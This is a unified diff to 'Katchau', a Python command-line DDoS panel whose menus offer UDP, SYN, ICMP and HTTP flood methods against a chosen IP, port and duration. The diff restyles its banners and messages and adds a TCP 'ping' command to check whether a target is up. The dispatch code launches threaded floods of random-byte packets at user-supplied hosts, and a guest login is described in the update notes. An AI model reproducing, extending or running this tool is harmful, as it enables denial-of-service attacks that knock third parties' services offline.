@@ -10,7 +10,7 @@ import os
 
 methods = """\033[91m
 ╔══════════════════════════════════════════════════════╗
-║                     \033[00mDDOS Methods\033[91m     ║               
+║                     \033[00mDDOS Methods\033[91m                     ║               
 ║══════════════════════════════════════════════════════║
 ║ \033[00mUDP (IP) (PORT) (TIME) (SIZE)  \033[91m|\033[00m UDP Attack.\033[91m         ║
 ║ \033[00mSYN (IP) (PORT) (TIME) (SIZE)  \033[91m|\033[00m SYN Attack.\033[91m         ║
@@ -21,45 +21,46 @@ methods = """\033[91m
 
 info = """\033[91m
 ╔══════════════════════════════════════════════════════╗
-║                     \033[00mKatchau Info\033[91m     ║
+║                     \033[00mKatchau Info\033[91m                     ║
 ║══════════════════════════════════════════════════════║
-║ \033[00m[+] Katchau Was Made By Faisca.\033[91m      ║
-║ \033[00m[+] Discord: FAISCA12#1337.\033[91m          ║
-║ \033[00m[+] Instagram: RicardoFaisca12.\033[91m      ║
-║ \033[00m[+] YouTube: RicardoFaisca12.\033[91m        ║
+║ \033[00m[+] Katchau Was Made By Faisca.\033[91m                      ║
+║ \033[00m[+] Discord: FAISCA12#1337.\033[91m                          ║
+║ \033[00m[+] Instagram: RicardoFaisca12.\033[91m                      ║
+║ \033[00m[+] YouTube: RicardoFaisca12.\033[91m                        ║
 ╚══════════════════════════════════════════════════════╝\033[00m
 """
 
 extras = """\033[91m
 ╔══════════════════════════════════════════════════════╗
-║                        \033[00mExtras\033[91m        ║
+║                        \033[00mExtras\033[91m                        ║
 ║══════════════════════════════════════════════════════║
 ║ \033[00mAttacks          \033[91m|\033[00m Shows How Many Running Attacks.\033[91m   ║
 ║ \033[00mStop             \033[91m|\033[00m Stops All Running Attacks.\033[91m        ║
 ║ \033[00mResolve (DOMAIN) \033[91m|\033[00m Grabs A Domains IP.\033[91m               ║
+║ \033[00mPing (IP) (PORT) \033[91m|\033[00m Ping Someones Ip.\033[91m                 ║
 ╚══════════════════════════════════════════════════════╝\033[00m
 """
 
 help = """\033[91m
 ╔══════════════════════════════════════════════════════╗
-║                    \033[00mBasic Commands\033[91m    ║
+║                    \033[00mBasic Commands\033[91m                    ║
 ║══════════════════════════════════════════════════════║
-║ \033[00mMethods \033[91m|\033[00m Shows DDOS Methods For Katchau.\033[91m             ║
-║ \033[00mExtras  \033[91m|\033[00m Shows Extra Commands For Katchau.\033[91m           ║
-║ \033[00mUpdates \033[91m|\033[00m Shows Update Notes For Katchau.\033[91m             ║
-║ \033[00mInfo    \033[91m|\033[00m Shows Katchau Info.\033[91m                         ║
+║ \033[00mMethods \033[91m|\033[00m Shows DDOS Methods For Katchau.\033[91m            ║
+║ \033[00mExtras  \033[91m|\033[00m Shows Extra Commands For Katchau.\033[91m          ║
+║ \033[00mUpdates \033[91m|\033[00m Shows Update Notes For Katchau.\033[91m            ║
+║ \033[00mInfo    \033[91m|\033[00m Shows Katchau Info.\033[91m                        ║
 ║ \033[00mClear   \033[91m|\033[00m Clears Screen.\033[91m                             ║
-║ \033[00mExit    \033[91m|\033[00m Exits Out Of Katchau.\033[91m                       ║
+║ \033[00mExit    \033[91m|\033[00m Exits Out Of Katchau.\033[91m                      ║
 ╚══════════════════════════════════════════════════════╝\033[00m
 """
 
 updatenotes = """\033[91m
 ╔══════════════════════════════════════════════════════╗
-║                     \033[00mUpdate Notes\033[91m     ║
+║                     \033[00mUpdate Notes\033[91m                     ║
 ║══════════════════════════════════════════════════════║
 ║ \033[00m[+] Timeout Bug Fixed.\033[91m                               ║
 ║ \033[00m[+] Took Out Some Tools.\033[91m                             ║
-║ \033[00m[+] User And Pass Changed To Katchau.\033[91m                 ║
+║ \033[00m[+] User And Pass Changed To Katchau.\033[91m                ║
 ║ \033[00m[+] To Be A Guest Type "Guest" For User And Pass.\033[91m    ║
 ║ \033[00m[+] All Tools Fixed And Working.\033[91m                     ║
 ╚══════════════════════════════════════════════════════╝\033[00m
@@ -68,20 +69,20 @@ updatenotes = """\033[91m
 banner = """
 ╔══════════════════════════════════════════════════════╗
 ║                     \033[00m
- ____  __.  _________________________   ___ ___    _____   ____ ___ 
-|    |/ _| /  _  \__    ___/\_   ___ \ /   |   \  /  _  \ |    |   \
-|      <  /  /_\  \|    |   /    \  \//    ~    \/  /_\  \|    |   /
-|    |  \/    |    \    |   \     \___\    Y    /    |    \    |  / 
-|____|__ \____|__  /____|    \______  /\___|_  /\____|__  /______/  
-        \/       \/                 \/       \/         \/           \033[91m
+       ▄ •▄  ▄▄▄· ▄▄▄▄▄ ▄▄·  ▄ .▄ ▄▄▄· ▄• ▄▌
+       █▌▄▌▪▐█ ▀█ •██  ▐█ ▌▪██▪▐█▐█ ▀█ █▪██▌
+       ▐▀▀▄·▄█▀▀█  ▐█.▪██ ▄▄██▀▐█▄█▀▀█ █▌▐█▌
+       ▐█.█▌▐█ ▪▐▌ ▐█▌·▐███▌██▌▐▀▐█ ▪▐▌▐█▄█▌
+       ·▀  ▀ ▀  ▀  ▀▀▀ ·▀▀▀ ▀▀▀ · ▀  ▀  ▀▀▀          \033[91m
 ║══════════════════════════════════════════════════════║
 
-                  \033[1;91m罪 深 い\033[00m
+                  \033[1;91m\033[00m
 """
 
 cookie = open(".Katchau_Cookie","w+")
 
 fsubs = 0
+tpings = 0
 liips = 0
 tattacks = 0
 uaid = 0
@@ -171,6 +172,7 @@ def httpsender(host, port, timer, punch):
 
 def main():
 	global fsubs
+	global tpings
 	global liips
 	global tattacks
 	global uaid
@@ -186,7 +188,7 @@ def main():
 
 	while True:
 		sys.stdout.write("\x1b]2;Katchau\x07")
-		sin = input("\033[1;00m[\033[91mKatchau\033[1;00m]-\033[91m家\033[00m ").lower()
+		sin = input("\033[1;00m[\033[91mKatchau\033[1;00m]-\033[91m⚡️ \033[00m ").lower()
 		sinput = sin.split(" ")[0]
 		if sinput == "clear":
 			os.system ("clear")
@@ -199,7 +201,7 @@ def main():
 			print (extras)
 			main()
 		elif sinput == "exit":
-			print ("[\033[91mSin\033[00m] You Are Exiting Out Of Katchau.\n")
+			print ("[\033[91m⚡️\033[00m] You Are Exiting Out Of Katchau.\n")
 			exit()
 		elif sinput == "methods":
 			print (methods)
@@ -211,76 +213,107 @@ def main():
 			print (info)
 			main()
 		elif sinput == "attacks":
-			print ("[\033[91mSin\033[00m] Total Attacks Running: {}\n".format (aid))
+			print ("[\033[91m⚡️\033[00m] Total Attacks Running: {}\n".format (aid))
 			main()
 		elif sinput == "resolve":
 			liips += 1
 			host = sin.split(" ")[1]
 			host_ip = socket.gethostbyname(host)
-			print ("[\033[91mSin\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}\n".format (host, host_ip))
+			print ("[\033[91m⚡️\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}\n".format (host, host_ip))
 			main()
+		elif sinput == "ping":
+			tpings += 1
+			try:
+				sinput, host, dport = sin.split(" ")
+				print ("[\033[91mKatchau\033[00m] Starting Ping On Host: {}".format (host))
+				try:
+					ip = socket.gethostbyname(host)
+				except socket.gaierror:
+					print ("[\033[91mKatchau\033[00m] Host Un-Resolvable.")
+					main()
+				while True:
+					try:
+						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+						sock.settimeout(2)
+						start = time.time() * 1000
+						sock.connect ((host, int(dport)))
+						stop = int(time.time() * 1000 - start)
+						sys.stdout.write("".format (stop))
+						print ("[\033[91mKatchau\033[00m] | Time: {}ms [UP]".format(ip, dport, stop))
+						sock.close()
+						time.sleep(1)
+					except socket.error:
+						sys.stdout.write("")
+						print ("[\033[91mKatchau\033[00m] {}:{} [DOWN]".format(ip, dport))
+						time.sleep(1)
+					except KeyboardInterrupt:
+						print("")
+						main()
+			except ValueError:
+				print ("[\033[91mKatchau\033[00m] The Command {} Requires An Argument.".format (sinput))
+				main()
 		elif sinput == "udp":
 			if username == "Guest":
-				print ("[\033[91mSin\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91m⚡️\033[00m] You Are Not Allowed To Use This Method.\n")
 				main()
 			else:
 				try:
 					sinput, host, port, timer, pack = sin.split(" ")
 					socket.gethostbyname(host)
-					print ("[\033[91mSin\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91m⚡️\033[00m] Attack Sent To: {}\n".format (host))
 					punch = random._urandom(int(pack))
 					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
 				except ValueError:
-					print ("[\033[91mSin\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91m⚡️\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 					main()
 				except socket.gaierror:
-					print ("[\033[91mSin\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91m⚡️\033[00m] Host: {} Invalid.\n".format (host))
 					main()
 		elif sinput == "http":
 			try:
 				sinput, host, port, timer, pack = sin.split(" ")
 				socket.gethostbyname(host)
-				print ("[\033[91mSin\033[00m] Attack Sent To: {}\n".format (host))
+				print ("[\033[91m⚡️\033[00m] Attack Sent To: {}\n".format (host))
 				punch = random._urandom(int(pack))
 				threading.Thread(target=httpsender, args=(host, port, timer, punch)).start()
 			except ValueError:
-				print ("[\033[91mSin\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+				print ("[\033[91m⚡️\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 				main()
 			except socket.gaierror:
-				print ("[\033[91mSin\033[00m] Host: {} Invalid.\n".format (host))
+				print ("[\033[91m⚡️\033[00m] Host: {} Invalid.\n".format (host))
 				main()
 		elif sinput == "icmp":
 			if username == "Guest":
-				print ("[\033[91mSin\033[00m] You Are Not Allowed To Use This Method.\n")
+				print ("[\033[91m⚡️\033[00m] You Are Not Allowed To Use This Method.\n")
 				main()
 			else:
 				try:
 					sinput, host, port, timer, pack = sin.split(" ")
 					socket.gethostbyname(host)
-					print ("[\033[91mSin\033[00m] Attack Sent To: {}\n".format (host))
+					print ("[\033[91m⚡️\033[00m] Attack Sent To: {}\n".format (host))
 					punch = random._urandom(int(pack))
 					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
 				except ValueError:
-					print ("[\033[91mSin\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+					print ("[\033[91m⚡️\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 					main()
 				except socket.gaierror:
-					print ("[\033[91mSin\033[00m] Host: {} Invalid.\n".format (host))
+					print ("[\033[91m⚡️\033[00m] Host: {} Invalid.\n".format (host))
 					main()
 		elif sinput == "syn":
 			try:
 				sinput, host, port, timer, pack = sin.split(" ")
 				socket.gethostbyname(host)
-				print ("[\033[91mSin\033[00m] Attack Sent To: {}\n".format (host))
+				print ("[\033[91m⚡️\033[00m] Attack Sent To: {}\n".format (host))
 				punch = random._urandom(int(pack))
 				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
 			except ValueError:
-				print ("[\033[91mSin\033[00m] The Command {} Requires An Argument.\n".format (sinput))
+				print ("[\033[91m⚡️\033[00m] The Command {} Requires An Argument.\n".format (sinput))
 				main()
 			except socket.gaierror:
-				print ("[\033[91mSin\033[00m] Host: {} Invalid.\n".format (host))
+				print ("[\033[91m⚡️\033[00m] Host: {} Invalid.\n".format (host))
 				main()
 		elif sinput == "stop":
-			print ("[\033[91mSin\033[00m] All Running Attacks Have Been Stopped.\n")
+			print ("[\033[91m⚡️\033[00m] All Running Attacks Have Been Stopped.\n")
 			attack = False
 			while not attack:
 				if aid == 0:
@@ -292,18 +325,18 @@ def main():
 				udp = False
 				while not udp:
 					if aid == 0:
-						print ("[\033[91mSin\033[00m] No UDP Processes Running.")
+						print ("[\033[91m⚡️\033[00m] No UDP Processes Running.")
 						udp = True
 						main()
 			if what == "icmp":
 				print ("Stopping All ICMP Attacks.\n")
 				icmp = False
 				while not icmp:
-					print ("[\033[91mSin\033[00m] No ICMP Processes Running.")
+					print ("[\033[91m⚡️\033[00m] No ICMP Processes Running.")
 					udp = True
 					main()
 		else:
-			print ("[\033[91mSin\033[00m] {} Is Not A Command.\n".format(sinput))
+			print ("[\033[91m⚡️\033[00m] {} Is Not A Command.\n".format(sinput))
 			main()
 
 
@@ -335,7 +368,7 @@ try:
 				print (banner)
 				main()
 			except KeyboardInterrupt:
-				print ("\n[\033[91mSin\033[00m] Ctrl-C Has Been Pressed.\n")
+				print ("\n[\033[91m⚡️\033[00m] Ctrl-C Has Been Pressed.\n")
 				main()
 		else:
 			print ("[+] Incorrect, Exiting.\n")
@@ -352,7 +385,7 @@ try:
 				print (banner)
 				main()
 			except KeyboardInterrupt:
-				print ("\n[\033[91mSin\033[00m] Ctrl-C Has Been Pressed.\n")
+				print ("\n[\033[91m⚡️\033[00m] Ctrl-C Has Been Pressed.\n")
 				main()
 		else:
 			print ("[+] Incorrect, Exiting.\n")
